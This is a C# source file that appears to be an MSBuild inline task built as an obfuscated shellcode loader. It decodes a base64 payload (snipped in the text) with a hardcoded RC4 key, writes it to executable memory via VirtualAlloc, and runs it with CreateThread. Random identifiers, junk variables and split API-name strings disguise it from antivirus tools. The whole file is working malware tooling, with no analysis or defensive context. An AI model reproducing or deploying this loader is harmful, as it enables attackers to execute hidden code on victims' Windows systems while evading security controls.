		using System;
		using System.IO;
		using System.Text;
		using System.Management;
		using System.Management.Automation;
		using System.Collections.Generic;
		using System.Collections.ObjectModel;
		using Microsoft.Build.Utilities;
		using Microsoft.Build.Framework;
		using System.Management.Automation.Runspaces;
		using System.Runtime.InteropServices;
		
		public class KqTBOvLc :  Task, ITask 
{
        private static UInt32 vAZIJYGxZvYnuaKVRs = 0x1000;
        private static UInt32 EPhYZUwyAQtskNddQviYOiWB = 0x40;
        [DllImport("kernel32")]
        private static extern UInt32 VirtualAlloc(UInt32 xulyaFGNn, UInt32 zcqJHIsh, UInt32 SydGXpccdVWHXRrcYYk, UInt32 gNVRBMeLCc);
        [DllImport("kernel32")]
        private static extern UInt32 WaitForSingleObject(IntPtr leHJH, UInt32 uNuCG);
        [UnmanagedFunctionPointer(CallingConvention.Cdecl)]
        private delegate IntPtr VvlyERSRQPgTXIbKFOl(IntPtr ZepiGmWQ, UInt32 VvlyERSRQPgTXIbKFOl, IntPtr mqZrXSiOONZ, IntPtr gNVRBMeLCc, UInt32 vAZIJYGxZvYnuaKVRs, ref UInt32 iJjLbeh);
        [DllImport("kernel32.dll")]
        public static extern IntPtr LoadLibrary(string uNuCG);
        [DllImport("kernel32.dll")]
        public static extern IntPtr GetProcAddress(IntPtr foVievWIPZwhlAxOOnu, string iJjLbeh);

        public override bool Execute() 
        {
            decimal YVjyRfRNmPDnZkX = 51299;
            int hwgapDHRbxbTUTD = 70340;
            long UieJbBibpvOK = 30627;
            var LhQVzfzFSFQkxvkQKebALQrW = 61313;

            byte[] spnrnaqclFFWwWmefGPLaR = {0x63, 0xc4, 0x3f, 0xa8, 0x3b, 0x8f, 0x96, 0x42, 0xf4, 0x08, 0x48, 0xd4, 0x48, 0x9a, 0x6b, 0x3a, 0x17, 0xa4, 0x8a, 0x32, 0x74, 0xc4, 0x82, 0xbb, 0x80, 0x29, 0xee, 0xf8, 0xca, 0x18, 0x89, 0x27};
            string ZepiGmWQ = GTvrqnhaABeq.TgvPLgP("<snip>");
            byte[] yxkQcZd = Convert.FromBase64String(ZepiGmWQ);
            byte[] DzxOylmeWDmh = SydGXpccdVWHXRrcYYk.wTZmFfMyGS(spnrnaqclFFWwWmefGPLaR, yxkQcZd);

            IntPtr nHMEWwfgQlsqeTGplfSHtOwz = LoadLibrary("kerne"+"l32.d"+"ll");
            double KbHivOibA = 39684;
            var TBNTGSxPwTHkdZkOVfKUP = 44185;
            long rGXVijElZRehnO = 17270;
            decimal eRhBDfELjFCN = 7677;

            IntPtr qAujFuMqC = GetProcAddress(nHMEWwfgQlsqeTGplfSHtOwz, "Crea"+"t"+"eTh"+"read");
            VvlyERSRQPgTXIbKFOl GKKfkw = (VvlyERSRQPgTXIbKFOl)Marshal.GetDelegateForFunctionPointer(qAujFuMqC, typeof(VvlyERSRQPgTXIbKFOl));
            long sWVSpyyySY = 22024;
            float JAjqrcAblqez = 21307;

            UInt32 IXOeVIDRIkWvkD = VirtualAlloc(0, (UInt32)DzxOylmeWDmh.Length, vAZIJYGxZvYnuaKVRs, EPhYZUwyAQtskNddQviYOiWB);
            Marshal.Copy(DzxOylmeWDmh, 0, (IntPtr)(IXOeVIDRIkWvkD), DzxOylmeWDmh.Length);
            IntPtr mWsKVarxDWKPiRRNCiSvBEEG = IntPtr.Zero;
            IntPtr KMMDwIPJrjiunqiDory = IntPtr.Zero;
            UInt32 BVWzRNZxCLXJrqXQfisR = 0;
            mWsKVarxDWKPiRRNCiSvBEEG = GKKfkw(IntPtr.Zero, 0, (IntPtr)IXOeVIDRIkWvkD, KMMDwIPJrjiunqiDory, 0, ref BVWzRNZxCLXJrqXQfisR);
            WaitForSingleObject(mWsKVarxDWKPiRRNCiSvBEEG, 0xFFFFFFFF);
            return true;
        }
    }

    public class GTvrqnhaABeq 
        {
            public static string TgvPLgP(string KUxFaY) 
            {
                string xdhzEzrSqFljzzlv = "?@&!-~#$%";
                string efrYOKkdg = ".([,*}<]>)`{";
                return KUxFaY.Replace(xdhzEzrSqFljzzlv, "m").Replace(efrYOKkdg, "V");
            }
        }

    public class SydGXpccdVWHXRrcYYk 
        {
        public static byte[] uNuCG(byte[] DosPHtoHjntaft, byte[] PXfaeFFgmXauTVHsetwW) 
        {
            int IrjYgGewGwW, xulyaFGNn, bSUhYFqxXMrvW, jxBnutynbdQwnK, HZuCnMiLlVIBuqWMIb;
            int[] ywCVZEYaqlZwe, iJjLbeh;
            byte[] OFXheWzIQ;

            ywCVZEYaqlZwe = new int[256];
            iJjLbeh = new int[256];
            OFXheWzIQ = new byte[PXfaeFFgmXauTVHsetwW.Length];

        for (xulyaFGNn = 0; xulyaFGNn < 256; xulyaFGNn++) 
            {
                ywCVZEYaqlZwe[xulyaFGNn] = DosPHtoHjntaft[xulyaFGNn % DosPHtoHjntaft.Length];
                iJjLbeh[xulyaFGNn] = xulyaFGNn;
            }
        for (bSUhYFqxXMrvW = xulyaFGNn = 0; xulyaFGNn < 256; xulyaFGNn++) 
        {
            bSUhYFqxXMrvW = (bSUhYFqxXMrvW + iJjLbeh[xulyaFGNn] + ywCVZEYaqlZwe[xulyaFGNn]) % 256;
            HZuCnMiLlVIBuqWMIb = iJjLbeh[xulyaFGNn];
            iJjLbeh[xulyaFGNn] = iJjLbeh[bSUhYFqxXMrvW];
            iJjLbeh[bSUhYFqxXMrvW] = HZuCnMiLlVIBuqWMIb;
        }
        for (IrjYgGewGwW = bSUhYFqxXMrvW = xulyaFGNn = 0; xulyaFGNn < PXfaeFFgmXauTVHsetwW.Length; xulyaFGNn++) 
        {
            IrjYgGewGwW++;
            IrjYgGewGwW %= 256;
            bSUhYFqxXMrvW += iJjLbeh[IrjYgGewGwW];
            bSUhYFqxXMrvW %= 256;
            HZuCnMiLlVIBuqWMIb = iJjLbeh[IrjYgGewGwW];
            iJjLbeh[IrjYgGewGwW] = iJjLbeh[bSUhYFqxXMrvW];
            iJjLbeh[bSUhYFqxXMrvW] = HZuCnMiLlVIBuqWMIb;
            jxBnutynbdQwnK = iJjLbeh[((iJjLbeh[IrjYgGewGwW] + iJjLbeh[bSUhYFqxXMrvW]) % 256)];
            OFXheWzIQ[xulyaFGNn] = (byte)(PXfaeFFgmXauTVHsetwW[xulyaFGNn] ^ jxBnutynbdQwnK);
        }
        return OFXheWzIQ;
    }

    public static byte[] wTZmFfMyGS(byte[] BTCFkMKDuIWOeCIivmTdcfzK, byte[] qfYvFoLseEImTNPFELSqg) 
        {
        return uNuCG(BTCFkMKDuIWOeCIivmTdcfzK, qfYvFoLseEImTNPFELSqg);
        }
    }    
